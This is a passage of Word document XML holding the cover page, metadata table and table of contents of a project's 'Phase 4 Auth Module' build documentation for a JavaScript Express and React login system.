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00"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="9638"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEF2FF"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="12" w:color="4F5DFF"/>
              <w:left w:val="single" w:sz="12" w:color="4F5DFF"/>
              <w:bottom w:val="single" w:sz="12" w:color="4F5DFF"/>
              <w:right w:val="single" w:sz="12" w:color="4F5DFF"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="800" w:after="80"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="4F5DFF"/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:t>CMCMIS · PHASE 4</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="72"/>
              </w:rPr>
              <w:t>AUTH MODULE — SEALED</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:i/>
                <w:color w:val="4B5563"/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:t>End-to-End Technical Documentation</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="200"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b/>
                <w:color w:val="4F5DFF"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>STEP 1  →  STEP 8</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="4B5563"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Backend · Frontend · Security · Verification</w:t>
            </w:r>
          </w:p>
          <w:p/>
          <w:p/>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="16A34A"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>✓  JavaScript only · .js / .jsx ·  No TypeScript anywhere</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="800"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="4F5DFF"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Status: SHIPPED &amp; BROWSER-VERIFIED</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p/>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5100"/>
        <w:gridCol w:w="5100"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F3F4F6"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Document</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>phase4SEALED.docx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F3F4F6"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Version</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>v1.0 — Sealed</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F3F4F6"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Scope</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Documents EVERY file written during Phase 4 (BE + FE)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F3F4F6"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Audience</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Deep Sorathiya (DS) — internship deliverable + future self</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F3F4F6"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Companion to</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TECHNICALbaseORDERSphase.pdf (the BUILD PLAN); this doc is the BUILD RECORD</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F3F4F6"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Language</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>JavaScript end-to-end — .js (backend) · .jsx (frontend) · NEVER .ts/.tsx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F3F4F6"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Backend</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Node 18 + Express 4 + mysql2/promise + bcryptjs + jsonwebtoken + zod + pino</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F3F4F6"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Frontend</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Vite 5 + React 18 + Tailwind 3 + axios + zod + react-hook-form + lucide</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F3F4F6"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Database</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>MySQL `final` (Phase 3 sealed — 12 migrations, 53 active tables)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F3F4F6"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Status</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>🟢 SEALED — 8 of 8 steps green, browser-acceptance passed</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F3F4F6"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Prepared by</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Claude (AI engineering pair) — Technical Documentation Engineer mode</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F3F4F6"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Generated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>2026-05-18</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="480" w:after="200"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="4" w:color="4F5DFF"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="4F5DFF"/>
          <w:sz w:val="48"/>
        </w:rPr>
        <w:t>Table of Contents</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="4B5563"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Part-by-part. Each STEP gets a dedicated chapter with code-block walkthroughs, design rationale, and a verification gate.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>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Part</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3288"/>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Title</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>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What's in it</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Part I</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3288"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Overview &amp; Mission</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What we shipped, the JS-only rule, final file tree, stack</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="124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Part II</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="328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STEP 1 — Backend Skeleton</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Folder + package.json + env.js + logger.js + db.js + jwt.js + server.js</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Part III</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3288"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>STEP 2 — Middleware Pipeline</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helmet → cors → compression → json → cookies → pino-http → 404 → errorHandler</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="124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Part IV</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="328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STEP 3 — Auth Module</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validators → utils → repos → service → controller → routes (bottom-up)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Part V</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3288"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>STEP 4 — JWT Middleware Layer</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authorize.js permission gate factory (authenticate + rateLimit landed in STEP 3)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="124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Part VI</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="328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STEP 5 — Users Module (GET /me)</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Identity-from-JWT endpoint, no DB hop required</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Part VII</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3288"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>STEP 6 — Frontend Scaffold (JavaScript)</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Vite + Tailwind v3 + 11 design tokens + Brand + 5 UI primitives</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="124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Part VIII</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="328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STEP 7 — Frontend Auth Plumbing</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api-client.js (interceptors + coalescing) + AuthProvider + permissions + zod schema</w:t>
            </w:r>
          </w:p>
